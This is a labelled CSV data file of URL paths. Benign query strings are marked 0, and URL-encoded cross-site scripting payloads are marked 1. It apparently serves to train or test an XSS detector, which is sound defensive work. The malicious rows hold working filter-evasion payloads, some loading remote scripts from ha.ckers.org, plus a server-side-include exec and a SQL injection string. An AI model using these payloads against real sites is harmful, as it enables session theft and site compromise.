text,label
/sql_server?s3bucket=s3bucket,0
/spam_report?todate=todate,0
/60x45_LCPServer?levels=levels,0
/6306?additional=perl%20-e%20%26%23039%3Bprint%20%5C%26quot%3B%26lt%3BIMG%20SRC%3Djava%5C0script%3Aalert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26gt%3B%5C%26quot%3B%3B%26%23039%3B%20%26gt%3B%20out,1
/top_ten?currency=%3Cbody/onload%3D%26lt%3B%21--%26gt%3B%26%2310alert%281%29%3E,1
/logo-sec?authserver=authserver,0
/site-directory?saveasdraft=%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C/SCRIPT%3E%22%3E,1
/linktrade?fromemail=%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EClickMe,1
/22064?results=%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx86javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/ldtw?membergroups=membergroups,0
/applynow?invoice=%3CIMG%20SRC%3Dx%20ondragend%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/logotype?currentPassword=currentPassword,0
/3747?log=log,0
/Centre?perpage=data%3Atext/html%3Bcharset%3Dutf-7%3Bbase64%2CIj48L3RpdGxlPjxzY3JpcHQ%2BYWxlcnQoMTMzNyk8L3NjcmlwdD4%3D,1
/80350?fbclearall=%3CIMG%20SRC%3Dx%20onseeked%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/home_en?id21level=id21level,0
/datatypes?company=%3Cimg%20SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E,1
/atxpsu?refreshinterval=%3Cimg%20%5Cx47src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/9521?static=static,0
/bt3?recurse=%3Ciframe%20style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22%20onmouseover%3D%22prompt%281%29%22%3E,1
/menu_down?savehostid=%26lt%3BDIV%20STYLE%3D%26quot%3Bwidth%3A%20expression%28alert%28%26apos%3BXSS%26apos%3B%29%29%3B%26quot%3B%26gt%3B,1
/20609?sname=%26lt%3BIMG%20SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%26gt%3B,1
/58079?AddressStatus=AddressStatus,0
/it_voip?goodfiles=%3Ca%20href%3D%22data%3Atext/html%3Bblabla%2C%26%2360%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2332%26%23115%26%23114%26%2399%26%2361%26%2334%26%23104%26%23116%26%23116%26%23112%26%2358%26%2347%26%2347%26%23115%26%23116%26%23101%26%23114%26%23110%26%23101%26%23102%26%2397%26%23109%26%23105%26%23108%26%23121%26%2346%26%23110%26%23101%26%23116%26%2347%26%23102%26%23111%26%23111%26%2346%26%23106%26%23115%26%2334%26%2362%26%2360%26%2347%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%26%238203%22%3EClick%20Me%3C/a%3E,1
/35542?changeusername=changeusername,0
/dbfpy?rev=%3Cform%3E%3Cbutton%20formaction%3Djavascript%26colon%3Balert%281%29%3ECLICKME,1
/003061?vbxsite=%3Ciframe/onreadystatechange%3Dalert%281%29,1
/navPartners?square=square,0
/startowa?notrap=notrap,0
/34007?consoleview=%5C%5C%22%3Balert%28%27XSS%27%29%3B//,1
/0080?delfriend=delfriend,0
/disinfo?author=author,0
/content_library?broken=%3Cvmlframe%20xmlns%3Durn%3Aschemas-microsoft-com%3Avml%20style%3Dbehavior%3Aurl%28%23default%23vml%29%3Bposition%3Aabsolute%3Bwidth%3A100%25%3Bheight%3A100%25%20src%3D%25%28vml%29s%23xss%3E%3C/vmlframe%3E,1
/inquirer?dopt=dopt,0
/54375?unit=unit,0
/News_Story?paporchap=paporchap,0
/gente?fileOffset=fileOffset,0
/cryptolaw?mini=%3Ciframe%20src%3Dj%26Tab%3Ba%26Tab%3Bv%26Tab%3Ba%26Tab%3Bs%26Tab%3Bc%26Tab%3Br%26Tab%3Bi%26Tab%3Bp%26Tab%3Bt%26Tab%3B%3Aa%26Tab%3Bl%26Tab%3Be%26Tab%3Br%26Tab%3Bt%26Tab%3B%2528%26Tab%3B1%26Tab%3B%2529%3E%3C/iframe%3E,1
/86121?id24gid=%3CIMG%20SRC%3D%23%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/27944?varName=varName,0
/ibs?bookmark=bookmark,0
/article16?dircreate=dircreate,0
/6390?ProjectUserForm=ProjectUserForm,0
/ArmchairGM?fallback=%3Ca%20href%3D%22%5Cx11javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/Diskeeper?insertonly=insertonly,0
/200111?VPSSignature=VPSSignature,0
/Sociology?sqlquery=%3Capplet%20onError%20applet%20onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/applet%20onError%3E,1
/wel?layer=%3Cframeset%20onload%3Djavascript%3Aalert%281%29%3E,1
/p7220055?C=C,0
/press_room?asc=%22/%3E%3Cimg/onerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax%20/%3E,1
/gbook?passthrumacaddusername=%3Cxml%20src%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/278434?updateRecordID=%3CHEAD%3E%3CMETA%20HTTP-EQUIV%3D%22CONTENT-TYPE%22%20CONTENT%3D%22text/html%3B%20charset%3DUTF-7%22%3E%20%3C/HEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-/SCRIPT%2BAD4-,1
/6235?ping=ping,0
/btn_buy?searchClause=searchClause,0
/technetmag?createuser=createuser,0
/runme?remdays=remdays,0
/logo_ftc?timestamp=timestamp,0
/20050630?nopackages=nopackages,0
/icon_more?userpass=%3Cbody%20onkeydown%20body%20onkeydown%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onkeydown%3E,1
/mickey?plug=%3Cbody%20onload%3D%22document.vulnerable%3Dtrue%3B%22%3E,1
/watchlist?inputSearchVal=%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EClickMe,1
/usatoday?PHONE=%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E,1
/1615?TableList=%26lt%3BIMG%20SRC%3D%26quot%3B%20%26amp%3B%2314%3B%20%20javascript%3Aalert%28%26apos%3BXSS%26apos%3B%29%3B%26quot%3B%26gt%3B,1
/btn_learnmore?editfilename=ABC%3Cdiv%20style%3D%22x%3A%5Cx09expression%28javascript%3Aalert%281%29%22%3EDEF,1
/fliside_05?mto=mto,0
/8947?timedescr=timedescr,0
/mihir?credit=credit,0
/broadband_internet?stat=stat,0
/brandy?combine=%3Cimg/src%3D%40%26%2332%3B%26%2313%3B%20onerror%20%3D%20prompt%28%27%26%2349%3B%27%29,1
/apg?datetype=datetype,0
/personal2?adm=%22%3E%3Ch1%3E%3Ciframe%20width%3D%22420%22%20height%3D%22315%22%20src%3D%22http%3A//www.youtube.com/embed/sxvccpasgTE%22%20frameborder%3D%220%22%20allowfullscreen%3E%3C/iframe%3E123%3C/h1%3E,1
/itlibrary?dig=dig,0
/001885?trapenable=trapenable,0
/20111?symbol=%26lt%3BIMG%20DYNSRC%3D%5C%22javascript%26%23058%3Balert%28%27XSS%27%29%5C%22%26gt%3B,1
/rawtapes?deliveries=%26lt%3BSTYLE%26gt%3B%40im%5Cport%26apos%3B%5Cja%5Cvasc%5Cript%3Aalert%28%26quot%3BXSS%26quot%3B%29%26apos%3B%3B%26lt%3B/STYLE%26gt%3B,1
/gay?radiusport2=%22/%3E%3Cimg/onerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax%20/%3E,1
/darkl0rd?hidem=hidem,0
/retro?authlvl=authlvl,0
/navbar_09?secs=secs,0
/p11?eventId=eventId,0
/marreaderschoice?greif=greif,0
/k4?id16level=%26%2313%3B%3Cblink/%26%2313%3B%20onmouseover%3Dpr%26%23x6F%3Bmp%26%23116%3B%281%29%3EOnMouseOver%20%7BFirefox%20%26%20Opera%7D,1
/loop?updateMsgCount=updateMsgCount,0
/fischer?searchid=%3CBGSOUND%20SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,1
/bondedsender?ABBR=ABBR,0
/buyer?aop=ABC%3Cdiv%20style%3D%22x%3A%5CxEF%5CxBB%5CxBFexpression%28javascript%3Aalert%281%29%22%3EDEF,1
/Broadcast?attachmentsid=%3C/font%3E/%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle/onload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C/font%3E/%3C/style%3E,1
/49414?smf=XSS/%2A-%2A/STYLE%3Dxss%3Ae/%2A%2A/xpression%28alert%28%27XSS%27%29%29%3E,1
/toolkits?duedate=duedate,0
/televiseurs?checkboxes=checkboxes,0
/3268?doExport=%26%23x00003C,1
/epc?mail=mail,0
/idiocy?benchmark=benchmark,0
/dot4?nick=nick,0
/54639?hc=hc,0
/mitnick?userids=%3Ca%20href%3D%22%5Cx18javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/4128?gfils=%3Cimg%20src%20%3Fitworksonchrome%3F%5C/onerror%20%3D%20alert%281%29,1
/underwear?Filter=%3Cembed%20src%3D%22http%3A//corkami.googlecode.com/svn/%21svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf%22%3E,1
/loop?ispublic=ispublic,0
/newspage-85?modE=modE,0
/15791?hardenglue=hardenglue,0
/44448?popupurl=%22%3E%3Cimg%20src%3Dx%20onerror%3Dwindow.open%28%27https%3A//www.google.com/%27%29%3B%3E,1
/6946?gmdName=gmdName,0
/23105?re=re,0
/2707?ftppass=ftppass,0
/btn_pricestrends?cls=%3Ca%20onmouseover%3Dalert%28document.cookie%29%3Exxs%20link%3C/a%3E,1
/newzealand?firstName=%3Cbody%20background%3Djavascript%3A%27%22%3E%3Cscript%3Ealert%28navigator.userAgent%29%3C/script%3E%3E%3C/body%3E,1
/BR?disk=disk,0
/21124?smiley=smiley,0
/flag-fra?mailbox=mailbox,0
/a2?GRANTOPTION=%3C%21%20foo%3D%22%5B%5B%5BInception%5D%5D%22%3E%3Cx%20foo%3D%22%5Dfoo%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E%22%3E,1
/5418?leave=%3Cscript/src%3Ddata%26colon%3Btext/j%5Cu0061v%5Cu0061%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%2C%5Cu0061%256C%2565%2572%2574%28/XSS/%29%3E%3C/script,1
/5112?allfields=%3CSCRIPT%20SRC%3D%22%25%28jpg%29s%22%3E%3C/SCRIPT%3E,1
/2003-September?13=%3Cbody%20onblur%20body%20onblur%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onblur%3E,1
/u5?personal=personal,0
/002902?dbhost=dbhost,0
/Net_LDAP?LegendMode=LegendMode,0
/dirt?changeit=%3Cimg%20src%3Dx%5Cx12onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/factsfigures?zpage=%3Ca%20href%3D%22javas%5Cx04cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/new_media?ins=%3C%3BIMG%20SRC%3D%22%3Bjavascript%3Aalert%28%27%3BXSS%27%3B%29%3B%22%3B%3E%3B,1
/addfeed?headerimage=%22%60%27%3E%3Cscript%3E%5CxC2%5Cx85javascript%3Aalert%281%29%3C/script%3E,1
/8289?tftp=%3Ca%20href%3D%22javascript%5Cx0D%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/137161?chmod=%3Ca%20href%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Bcookie%26rpar%3B%3EClick%20Here%3C/a%3E,1
/rob_orsini?id4gid=id4gid,0
/kent?foreignTable=foreignTable,0
/10855?boxes=boxes,0
/lanss20060510?feeds=feeds,0
/newrack?flashpga=flashpga,0
/67266?changes=%3Ca%20href%3D%22%5CxE1%5Cx9A%5Cx80javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/38989?check1=%26lt%3BBODY%20BACKGROUND%3D%5C%22javascript%26%23058%3Balert%28%27XSS%27%29%5C%22%26gt%3B,1
/index-129?langID=langID,0
/savoy?upip=upip,0
/echomail?passthrumacadd=%27%22%3E%3C/title%3E%3Cscript%3Ealert%28%22XSS%20by%20%5Cnxss%22%29%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20xss%3C/h1%3E%3C/marquee%3E,1
/mind?blastname=blastname,0
/Order?reportType=%3CDIV%20STYLE%3D%22width%3A%20expression%28alert%28%27XSS%27%29%29%3B%22%3E,1
/Developer?regdhcpstatic=%3CINPUT%20TYPE%3D%22IMAGE%22%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/Inspections?legendfont=%3Cscript%20onLoad%20script%20onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/script%20onLoad%3E,1
/Tail4Win_v1?val=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%5Cx0D%3Djavascript%3Aalert%281%29%3E,1
/dimension_e520?passf=passf,0
/18723?address0=%3Ca%20href%3D%22javascript%5Cx00%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/19373?renameext=%22/%3E%3Cimg/onerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax%20/%3E,1
/oeil?serverurl=%3C%3BA%20HREF%3D%22%3Bhttp%3A//ha.ckers.org%40google%22%3B%3E%3BXSS%3C%3B/A%3E%3B,1
/7877?sa=sa,0
/30224?newwin=newwin,0
/input?stdDateFilterField=%3Cframeset%20onload%3Djavascript%3Aalert%281%29%3E,1
/raytheon?aj=%3Cbody%20onFocus%20body%20onFocus%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onFocus%3E,1
/pursuit?radiusip2=%3Cmath%3E%3Ca%20xlink%3Ahref%3D%22//jsfiddle.net/t846h/%22%3Eclick,1
/pie?PASSWORD=PASSWORD,0
/8018?warning=%3CIMG%20SRC%3D/%20onerror%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E%3C/img%3E,1
/2552?variations=%3Ca%20href%3D%22%5CxE1%5Cx9A%5Cx80javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/Instant?budget=%22%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28%28%601%60%29%29%3E,1
/bh-link?searchable=searchable,0
/best?timeupdateinterval=timeupdateinterval,0
/3632?id8level=%3Ciframe%3C%3Fphp%20echo%20chr%2811%29%3F%3E%20onload%3Dalert%28%27XSS%27%29%3E%3C/iframe%3E,1
/6114?delgroup=delgroup,0
/9510?local=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5CxA8javascript%3Aalert%281%29%3C/script%3E,1
/colleges_schools?privileges=%3CIMG%20SRC%3Dx%20onseeked%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/Back4WinXP_v4?bib=bib,0
/reps?id20gid=id20gid,0
/0088?bconfirmemail=ABC%3Cdiv%20style%3D%22x%3A%5Cx20expression%28javascript%3Aalert%281%29%22%3EDEF,1
/p4?delfriend=%3Cform%3E%3Ca%20href%3D%22javascript%3A%5Cu0061lert%26%23x28%3B1%26%23x29%3B%22%3EX,1
/17463?following=following,0
/gru?ftp=ftp,0
/48014?zpage=zpage,0
/empcom?url=url,0
/hondaah?expires=expires,0
/download_sm?Calendar=Calendar,0
/catchamacrovirus?csv=csv,0
/0132269937?msn=msn,0
/Fleet_Feb1004?mensaje=%26lt%3BA%20HREF%3D%5C%22//google%5C%22%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/Frame?mfldr=mfldr,0
/ef?cfy=cfy,0
/am2?nopfsync=nopfsync,0
/2404?shell=%3Ca%20href%3D%22%5Cx16javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/6143?shout=%3CIMG%20SRC%3DJaVaScRiPt%3Aalert%28%26quot%3BXSS%3CWBR%3E%26quot%3B%29%3E,1
/Class?cop=%3Ca%20href%3D%22%5Cx1Djavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/22480?minJs=minJs,0
/iwsbanner?acct=%3CScRiPt%3Ealert%281%29%3C/sCriPt%3E,1
/sshhelperscreen?meta=meta,0
/topcount?deviceid=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx88javascript%3Aalert%281%29%3C/script%3E,1
/ceoletter?selectedmodule=selectedmodule,0
/frec?tweet=tweet,0
/demand?dizin=%3Cimg%20src%5Cx12%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/491?emptygenres=%26lt%3BIMG%20%26quot%3B%26quot%3B%26quot%3B%26gt%3B%26lt%3BSCRIPT%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B/SCRIPT%26gt%3B%26quot%3B%26gt%3B,1
/index326?ssid=ssid,0
/incest-sex?overrideID=%26lt%3BBASE%20HREF%3D%5C%22javascript%26%23058%3Balert%28%27XSS%27%29%3B//%5C%22%26gt%3B,1
/8636?control=control,0
/abarcarSQL?email1=email1,0
/001023?responsive=%3Cimg%20src%3D%22/%22%20%3D_%3D%22%20title%3D%22onerror%3D%27prompt%281%29%27%22%3E,1
/8297?functionp=%3Ciframe%20src%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Blocation%26rpar%3B%3E,1
/FreepnTheme01?conditions=%22%60%27%3E%3Cscript%3E%5CxEF%5CxBF%5CxAEjavascript%3Aalert%281%29%3C/script%3E,1
/34132?startmonth=%3CIMG%20SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E,1
/top20?deleteg=deleteg,0
/4767?salutation=%26%23X03C%3B,1
/Norton-Ghost?DUMP=%3CSCRIPT%20SRC%3D%22http%3A//ha.ckers.org/xss.jpg%22%3E%3C/SCRIPT%3E,1
/compworld_logo?fedit=%26lt%3BIMG%20SRC%3D%26quot%3Bmocha%3A%5Bcode%5D%26quot%3B%26gt%3B,1
/giezmfm?unlock=%3CDIV%20STYLE%3D%22background-image%3A%20url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,1
/battlestar?jCryption=jCryption,0
/Billing?proxy=proxy,0
/6016?activityID=%27%22%3E%3C/title%3E%3Cscript%3Ealert%281337%29%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20xss%3C/h1%3E%3C/marquee%3E,1
/Document-Management?ntporphan=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%27%20or%201%3D1%20or%20%27%27%3D%27%5D%5D%3E%3C/foof%3E,1
/d7?ddnsdomainkeyname=ddnsdomainkeyname,0
/index-82?usr=%3CXSS%20STYLE%3D%22behavior%3A%20url%28%25%28htc%29s%29%3B%22%3E,1
/co?cre=%253C,1
/30617?id6gid=%3CFRAMESET%3E%3CFRAME%20SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C/FRAMESET%3E,1
/graemlins?Cmd=%26lt%3BIMG%20SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%26gt%3B,1
/rihanna?old=old,0
/jdk?sqlwxp=%3CSCRIPT/XSS%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/6173?isSwitch=isSwitch,0
/2896?filecount=%26lt%3BSCRIPT/XSS%20SRC%3D%5C%22http%26%2358%3B//ha%26%2346%3Bckers%26%2346%3Borg/xss%26%2346%3Bjs%5C%22%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/Virtual?serdir=serdir,0
/repository?apn=%26lt%3B/TITLE%26gt%3B%26lt%3BSCRIPT%26gt%3Balert%28%5C%22XSS%5C%22%29%3B%26lt%3B/SCRIPT%26gt%3B,1
/toys_games?neg=neg,0
/agentCenter?crypt=crypt,0
/recording?err=err,0
/hijacked?tdir=tdir,0
/Team?ProfileField=%3CIMG%20SRC%3D%22jav%09ascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/antenna?somestuff=somestuff,0
/fur?u11=%3Ca%20href%3D%22javascript%5Cx3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/001930?itemcount=itemcount,0
/supportiwsd?Fields=Fields,0
/7350?gtype=%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-/script%2BAD4APAAi-,1
/puerto-rico?yearend=yearend,0
/avp?recordNum=%3CSTYLE%20type%3D%22text/css%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C/STYLE%3E,1
/webusers?newtype=%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Djavascript%3Ajavascript%3Aalert%281%29%3B%22%3E,1
/21795?perms2=perms2,0
/301?regdhcp=%26%23060,1
/UserEdit?crop=%27%22%3E%3C/title%3E%3Cscript%3Ealert%281111%29%3C/script%3E,1
/remlab?SURN=SURN,0
/webhostreportcard_logo?memberName=memberName,0
/advi_main?npassworda=npassworda,0
/companyprofile?unban=unban,0
/068?FXuser=FXuser,0
/survivalhistory?dataType=dataType,0
/PowerArchiver 2006?ids=%3Csvg%3E%3Cscript%20xlink%3Ahref%3Ddata%26colon%3B%2Cwindow.open%28%27https%3A//www.google.com/%27%29%3E%3C/script,1
/newbanner?finds=%3Csvg%20onLoad%20svg%20onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/svg%20onLoad%3E,1
/pittsburgh?liked=%26lt%3BSCRIPT%20SRC%3Dhttp%3A//ha.ckers.org/xss.js%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/pfizer-viagra?passd=passd,0
/0144?timeUnit=%3Cimg%20src%3Dx%20onerror%3D%5Cx00%22javascript%3Aalert%281%29%22%3E,1
/103846?oauth=%26lt%3BIMG%20SRC%3Djavascript%26%23058%3Balert%28%26quot%3BXSS%26quot%3B%29%26gt%3B,1
/193fact?transactionID=%26lt%3BSCRIPT%20%26quot%3Ba%3D%26apos%3B%26gt%3B%26apos%3B%26quot%3B%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.js%26quot%3B%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/WinDVD?TYPE=TYPE,0
/h9?debug=debug,0
/bottomRight?enable=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx2Fonerror%3Djavascript%3Aalert%281%29%3E,1
/holiday05?menuindex=%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27%3CSCR%27%22--%3E%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27IPT%20SRC%3Dhttp%3A//ha.ckers.org/xss.js%3E%3C/SCRIPT%3E%27%22--%3E,1
/28781?updatefile=updatefile,0
/a32?Plain=Plain,0
/2162?toggle=%3Cimg%20SRC%3D%22jav%20ascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/layoutscripts?rtl=rtl,0
/top_border?web=web,0
/mulberry?wins2=wins2,0
/Peaceact?frob=frob,0
/index108?criteriaColumnName=%3Cdiv%20id%3D%22x%22%3Ex%3C/div%3E%20%3Cxml%3Anamespace%20prefix%3D%22t%22%3E%20%3Cimport%20namespace%3D%22t%22%20implementation%3D%22%23default%23time2%22%3E%20%3Ct%3Aset%20attributeName%3D%22innerHTML%22%20targetElement%3D%22x%22%20to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E,1
/frec?tempName=%3Ciframe%20style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22%20onmouseover%3D%22prompt%281%29%22%3E,1
/5405?like=%3Ca%20href%3D%22%5CxE1%5CxA0%5Cx8Ejavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/bluetango?partition=partition,0
/23233?endmonth=perl%20-e%20%26%23039%3Bprint%20%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B/SCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B%20%26gt%3B%20out,1
/students?eid=%3Cscript%3Ejavascript%3Aalert%281%29%3C%5Cx00/script%3E,1
/184x138?StoreCategory=StoreCategory,0
/pgpkey?seed=seed,0
/molecule?logtype=%27%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%3C/h1%3E%3C/marquee%3E,1
/4246?milw0=milw0,0
/saveflash?attachmentsid=%3C%21--%5Bif%20gte%20IE%204%5D%3E%3CSCRIPT%3Edocument.vulnerable%3Dtrue%3B%3C/SCRIPT%3E%3C%21%5Bendif%5D--%3E,1
/semiconductors?context=context,0
/europedirect?go=go,0
/5958?power=%3Cimg%20src%3Dx%20onerror%3D%5Cx00%22javascript%3Aalert%281%29%22%3E,1
/go_search?Command=%3CMETA%20HTTP-EQUIV%3D%22Set-Cookie%22%20Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C/SCRIPT%3E%22%3E,1
/ninja2smallicon?medalid=medalid,0
/12387?asc=%3CSCRIPT/SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/productguide?features=%5Cx3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,1
/getpage?m3utitle=ABC%3Cdiv%20style%3D%22x%5Cx3Aexpression%28javascript%3Aalert%281%29%22%3EDEF,1
/pcsecurity?redfi=%26%23X003c%3B,1
/juanspla?deptid=deptid,0
/33143?branch=branch,0
/gup?thumbnail=thumbnail,0
/px_999999?xsrf=%26lt%3BSCRIPT%20SRC%3Dhttp%26%2358%3B//ha%26%2346%3Bckers%26%2346%3Borg/xss%26%2346%3Bjs%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/21094?chkalldocs=ABC%3Cdiv%20style%3D%22x%3A%5CxC2%5CxA0expression%28javascript%3Aalert%281%29%22%3EDEF,1
/codeofethics?editf=%3Cscript%3E/%2A%20%2A%5Cx00/javascript%3Aalert%281%29//%20%2A/%3C/script%3E,1
/tri?ie=%3Ca%20href%3D%22%5Cx04javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
